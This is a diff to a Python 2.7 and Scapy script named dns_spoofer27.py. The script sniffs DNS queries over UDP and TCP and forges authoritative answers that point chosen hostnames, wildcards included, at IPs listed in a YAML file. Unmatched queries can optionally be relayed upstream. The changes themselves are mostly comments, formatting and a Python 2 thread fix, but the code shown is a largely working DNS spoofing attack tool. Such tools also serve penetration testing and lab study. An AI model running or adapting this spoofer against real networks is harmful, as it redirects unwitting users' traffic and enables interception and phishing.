@@ -1,5 +1,8 @@
 #!/usr/bin/env python2
-# -*- coding: utf-8 -*-    
+# -*- coding: utf-8 -*-
+#
+# dns_spoofer27.py -- DNS spoof / relay for Python-2.7 + Scapy-2.4.5
+#
 
 from __future__ import print_function, absolute_import
 
@@ -27,9 +30,9 @@ from scapy.all import (
 def _u(s):
     """Return a unicode object under Py-2, no-op on Py-3."""
     try:
-        return unicode(s)   # noqa: F821  (undefined in Py-3, caught by try)
-    except NameError:
-        return s            # already unicode in Py-3
+        return unicode(s)                # noqa: F821
+    except NameError:                    # running under Py-3 (irrelevant here)
+        return s
 
 def setup_logging(verbose, quiet):
     if verbose and quiet:
@@ -42,37 +45,40 @@ def setup_logging(verbose, quiet):
     )
 
 def _normalise_qname(name):
+    """Lower-case, strip trailing dot, always unicode."""
     return _u(name).rstrip(u'.').lower()
 
 # --------------------------------------------------------------------------- #
-# main worker
+# worker thread
 # --------------------------------------------------------------------------- #
 class DNSSpoofer(threading.Thread):
-    """Spoof or relay DNS answers over both UDP and TCP."""
+    """Spoof or relay DNS answers over UDP *and* TCP."""
 
     def __init__(self, iface, mapping, upstream='8.8.8.8',
                  relay=False, ttl=300, bpf=None):
         threading.Thread.__init__(self)
-        self.daemon   = True
-        self.iface    = iface
-        self.mapping  = mapping
-        self.upstream = upstream
-        self.relay    = relay
-        self.ttl      = ttl
-        self.bpf      = bpf or 'udp or tcp port 53'
+        self.daemon    = True
+        self.iface     = iface
+        self.mapping   = mapping
+        self.upstream  = upstream
+        self.relay     = relay
+        self.ttl       = ttl
+        self.bpf       = bpf or 'udp or tcp port 53'
 
-        self._running = threading.Event()
+        self._running  = threading.Event()
         self._running.set()
-        self._tcp_thr = None
+        self._tcp_thr  = None
 
-    # ----------------------------------------  lookup / craft helpers
+    # ------------------------------------ lookup / crafting helpers
     def _lookup(self, qname):
+        """Return list[str] of spoof IPs or None."""
         qname = _normalise_qname(qname)
+
         if qname in self.mapping:
             val = self.mapping[qname]
             return val if isinstance(val, list) else [val]
 
-        # wildcard match  (“*.example.com”)
+        # wildcard (“*.example.com”)
         it = self.mapping.iteritems() if hasattr(self.mapping, 'iteritems') else self.mapping.items()
         for pattern, val in it:
             if pattern.startswith(u'*.') and qname.endswith(pattern[2:]):
@@ -80,11 +86,11 @@ class DNSSpoofer(threading.Thread):
         return None
 
     def _build_answers(self, qname, ips, qtype):
-        answer = None
+        answers = None
         for ip in ips:
             rr = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=str(ip))
-            answer = rr if answer is None else answer / rr
-        return answer
+            answers = rr if answers is None else answers / rr
+        return answers
 
     def _forge_response(self, pkt, ips):
         q      = pkt[DNSQR]
@@ -92,7 +98,7 @@ class DNSSpoofer(threading.Thread):
         dns    = DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=q, ancount=len(ips), an=answer)
 
-        ip_l   = IP(src=pkt[IP].dst,   dst=pkt[IP].src) if IP   in pkt else \
+        ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src) if IP in pkt else \
                  IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
 
         if UDP in pkt:
@@ -105,15 +111,15 @@ class DNSSpoofer(threading.Thread):
                       ack=pkt[TCP].seq + len(pkt[TCP].payload))
             return ip_l / tcp / dns
 
-    # ----------------------------------------  packet processors
+    # ------------------------------------ packet processors
     def _process_udp(self, pkt):
         if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
             return
-        qname = pkt[DNSQR].qname.decode()        # bytes → unicode
+        qname = pkt[DNSQR].qname.decode()
         ips   = self._lookup(qname)
         if ips:
             send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
-            logging.info('Spoofed %s → %s', qname, ', '.join(ips))
+            logging.info('Spoofed %s -> %s', qname, ', '.join(ips))
         elif self.relay:
             self._relay_upstream(pkt)
 
@@ -124,11 +130,11 @@ class DNSSpoofer(threading.Thread):
         ips   = self._lookup(qname)
         if ips:
             send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
-            logging.info('(TCP) Spoofed %s → %s', qname, ', '.join(ips))
+            logging.info('(TCP) Spoofed %s -> %s', qname, ', '.join(ips))
         elif self.relay:
             self._relay_upstream(pkt)
 
-    # ----------------------------------------  relay (UDP-only to upstream)
+    # ------------------------------------ upstream relay (UDP-only)
     def _relay_upstream(self, pkt):
         qname = pkt[DNSQR].qname.decode()
         sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -146,12 +152,12 @@ class DNSSpoofer(threading.Thread):
         udp_l  = UDP(sport=53, dport=pkt[UDP].sport)
         send(ip_l / udp_l / DNS(data), iface=self.iface, verbose=0)
 
-    # ----------------------------------------  thread lifecycle
+    # ------------------------------------ thread lifecycle
     def run(self):
         logging.info('DNS spoofing on %s  (relay=%s)  filter="%s"',
                      self.iface, self.relay, self.bpf)
 
-        # TCP sniffer runs in secondary thread
+        # TCP sniffer in a classic Py-2 style thread
         self._tcp_thr = threading.Thread(
             target=lambda: sniff(
                 iface=self.iface,
@@ -159,11 +165,11 @@ class DNSSpoofer(threading.Thread):
                 prn=self._process_tcp,
                 store=0,
                 stop_filter=lambda *_: not self._running.is_set(),
-            ),
-            daemon=True)
+            ))
+        self._tcp_thr.daemon = True
         self._tcp_thr.start()
 
-        # UDP sniffer (main thread)
+        # UDP sniffer runs in this thread
         sniff(iface=self.iface,
               filter='udp and (%s)' % self.bpf,
               prn=self._process_udp,
@@ -181,7 +187,7 @@ class DNSSpoofer(threading.Thread):
 def load_mapping(path):
     raw = yaml.safe_load(open(path, 'rb'))
     if not isinstance(raw, dict):
-        raise ValueError('YAML must be a dictionary of host → IP')
+        raise ValueError('YAML must be a host→IP dictionary')
 
     mapping = {}
     it = raw.iteritems() if hasattr(raw, 'iteritems') else raw.items()
@@ -191,12 +197,11 @@ def load_mapping(path):
 
         good = []
         for ip in ips_raw:
-            try:                                # ipaddress needs unicode
-                ipaddress.ip_address(_u(ip))
+            try:
+                ipaddress.ip_address(_u(ip))      # ipaddress needs unicode in Py-2
                 good.append(str(ip))
             except ValueError:
-                logging.warning('Ignoring invalid IP "%s" (host %s)',
-                                ip, host_norm)
+                logging.warning('Ignoring invalid IP "%s" (host %s)', ip, host_norm)
         if good:
             mapping[host_norm] = good if len(good) > 1 else good[0]
     return mapping
@@ -212,14 +217,15 @@ def main():
                     help='Forward unmatched queries upstream')
     ap.add_argument('--upstream', default='8.8.8.8',
                     help='Upstream DNS for relay mode')
-    ap.add_argument('--ttl', type=int, default=300,
-                    help='TTL for forged answers')
+    ap.add_argument('--ttl',  type=int, default=300, help='TTL for forged answers')
+
     vq = ap.add_mutually_exclusive_group()
     vq.add_argument('-v', '--verbose', action='store_true')
     vq.add_argument('-q', '--quiet',   action='store_true')
-    ap.add_argument('--bpf', help='Extra BPF to AND with port 53')
 
+    ap.add_argument('--bpf', help='Extra BPF to AND with port 53')
     args = ap.parse_args()
+
     setup_logging(args.verbose, args.quiet)
 
     try:
